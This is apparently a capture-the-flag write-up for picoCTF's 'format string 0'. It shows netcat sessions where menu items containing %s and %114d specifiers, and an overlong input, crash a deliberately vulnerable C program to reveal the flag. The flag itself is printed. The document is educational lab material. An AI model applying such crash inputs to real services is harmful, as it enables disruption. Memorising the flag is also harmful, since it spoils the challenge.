# format string 0
# Description
Can you use your knowledge of format strings to make the customers happy? Download the binary here. Download the source here. Connect with the challenge instance here:

# Solution
- Connect to the server using nc.
The program gives you three burgers to pick from, if we look at the source code :-
![Screenshot from 2024-11-03 20-30-54](https://github.com/user-attachments/assets/31c27bcf-92b3-461e-9c29-9b6defb9b75a)

Our input needs to satisfy two conditions to go to the next function serve_bob(). It needs to be on the menu and its size must be 2* buffer_size.
The buffer size is set to 32 initially. 
- In C format specifier takes %114d in Gr%114d_Cheese as an integer with 114 characters. Even if no number is provided its size will still be 114 characters. You can notice it when the value is printed.
- Out of all three options only Gr%114d_Cheese has more than (32*2=)64 characters. Moving onto next step.
- The line "Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!" gives a hint that we need to crash the program run
![Screenshot from 2024-11-03 20-31-32](https://github.com/user-attachments/assets/506f9db8-b3b4-428a-b4e9-c9d91da50f43)


- We don't get much info from the code but looking at the menu options you notice Cla%sic_Che%s%steak.
- %s is for string and since no string is provided as argument, printf() is unable to process it and crashes giving the flag
```bash
crypto@crypto:~/pico$ nc mimas.picoctf.net 63557
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese 
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```
# Alternate Solution
- When trying it initially, I did get the flag by giving an absurd value as input.
- Which was really confusing, but this worked because I managed to crash the program.
- You can do it by giving any input, doesn't even have to be a format specifier just long enough that the program can't handle it.

```bash
crypto@crypto:~/pico$ nc mimas.picoctf.net 54355
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 14489999999999999922222222222222222222222222229s
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```
> Flag: picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}

This challenge is considered easy as you can get the flag even by trial and error with all the different options.
